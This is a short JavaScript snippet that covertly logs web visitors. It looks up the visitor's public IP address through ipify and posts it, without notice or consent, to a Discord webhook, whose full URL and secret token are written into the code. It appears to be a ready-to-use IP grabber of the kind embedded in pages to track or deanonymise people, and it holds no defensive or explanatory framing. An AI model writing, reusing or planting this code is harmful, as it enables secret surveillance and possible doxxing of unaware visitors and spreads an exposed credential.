fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    console.log('IP Address:', ip);

    fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `New visitor IP: ${ip}` })
    });
  })
  .catch(err => console.error('Error getting IP:', err));
